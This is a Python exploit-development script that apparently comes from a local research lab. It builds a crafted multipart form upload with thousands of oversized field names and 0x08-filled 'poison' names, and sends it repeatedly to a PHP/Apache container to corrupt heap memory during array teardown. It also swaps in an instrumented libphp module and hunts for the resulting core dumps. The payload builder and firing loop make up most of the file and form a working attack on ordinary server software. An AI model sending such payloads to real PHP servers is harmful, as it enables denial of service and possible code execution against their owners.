#!/usr/bin/env python3
"""oom58: GATE EXPERIMENT — make the instrument crash-proof, re-fire the attack,
and read what stock teardown sees in the dying table's tail slots.

Background: previous instrument used fprintf(stderr,...) inside
zend_array_destroy probes. stdio FILE* internals touched poisoned heap =>
instrument-mediated crashes (rdi=0x0808... core). Fix: ALL probes now
snprintf() into a stack buffer + a single raw write(2). snprintf never touches
any FILE object; probes only read our own arData bounds.

Trigger widened: last-2 slots OR type>IS_OBJECT OR value-word[0]==0x0808080808080808.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
NAMELEN = 3064
LIB = "/usr/lib/apache2/modules/libphp.so"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * 10237 + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:120]
    except Exception as e:
        return type(e).__name__, str(e)[:120]


def logs_tail():
    r = subprocess.run(["docker", "logs", "--tail", "400", "php_vuln"],
                       capture_output=True, timeout=90)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def segv_count():
    return len(re.findall(r"exit signal Segmentation", logs_tail()))


def main():
    print("=== [0] re-establish lab env (idempotent) ===", flush=True)
    stock = sh("md5sum /tmp/libphp.so.stock 2>/dev/null | cut -c1-8", 15, retries=1)
    print("[stock backup]", stock or "MISSING", flush=True)
    dcp(PHPLAB + "/oomlab.ini", "php_vuln:/usr/local/etc/php/conf.d/30-oomlab.ini")
    sh("grep -q PHPRC /etc/apache2/envvars || echo 'export PHPRC=/usr/local/etc/php/conf.d/30-oomlab.ini' >> /etc/apache2/envvars")
    sh("grep -q oomcore /etc/apache2/conf-enabled/oomcore.conf 2>/dev/null || printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("sed -i '/oomlab/d' /etc/apache2/envvars; grep -q PHPRC /etc/apache2/envvars || echo 'export PHPRC=/usr/local/etc/php/conf.d/30-oomlab.ini' >> /etc/apache2/envvars")
    print("[envvars PHPRC]", sh("grep PHPRC /etc/apache2/envvars", 15), flush=True)

    print("=== [1] swap instrumented module (write2-probe build) ===", flush=True)
    dcp(PHPLAB + "/libphp.so.w2", "php_vuln:" + LIB)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(20):
        time.sleep(1.5)
        c, probe = http("/oom_sapi.php", timeout=5)
        if c == 200:
            break
    print("[ini]", probe, flush=True)
    if "lim=20600000" not in probe:
        print("[ABORT] lab ini not active", flush=True)
        return

    base = segv_count()
    print("[baseline] segv(400tail)=%d" % base, flush=True)

    print("=== [2] fire attacks ===", flush=True)
    att = build_attack()
    for i in range(8):
        code, text = http("/oom_mod.php", att,
                          "multipart/form-data; boundary=BOUND", 40)
        time.sleep(1.5)
        now = segv_count()
        print("  atk%d: %s segv_new=%d" % (i, code, now - base), flush=True)
        logs = logs_tail()
        w2 = re.findall(r"W2 \S.*", logs)
        if w2:
            print("  [W2 probes this round] %d lines" % len(w2), flush=True)
            for ln in w2[-14:]:
                print("   ", ln[:180], flush=True)
            break
        for _ in range(3):
            http("/oom_mod.php",
                 b'--BOUND\r\nContent-Disposition: form-data; name="a"\r\n\r\n1\r\n--BOUND--\r\n',
                 "multipart/form-data; boundary=BOUND", 15)

    print("=== [3] verdict ===", flush=True)
    final_logs = logs_tail()
    w2_all = re.findall(r"W2 \S.*", final_logs)
    segv_new = segv_count() - base
    print("[segv new] %d | [W2 probe lines] %d" % (segv_new, len(w2_all)), flush=True)
    poison_seen = [l for l in w2_all if "0808080808080808" in l]
    print("[poison-reading lines]", len(poison_seen), flush=True)
    for ln in poison_seen[-10:]:
        print("   ", ln[:200], flush=True)
    if segv_new:
        print("=== [4] core hunt ===", flush=True)
        for _ in range(3):
            ls = sh("ls /tmp/core* 2>/dev/null", 15, retries=1)
            if ls.startswith("/tmp/core"):
                print("[core]", sh("ls -la " + ls.split()[0], 15), flush=True)
                dcp("php_vuln:" + ls.split()[0], PHPLAB + "/child.core.w2")
                print("[core saved] child.core.w2", flush=True)
                break
            time.sleep(2)

    # always restore stock
    print("=== [5] restore stock ===", flush=True)
    sh("cp /tmp/libphp.so.stock %s" % LIB)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/30-oomlab.ini/d; /oomcore/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        c, probe = http("/oom_sapi.php", timeout=5)
        if c == 200:
            break
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15), probe, flush=True)


if __name__ == "__main__":
    main()
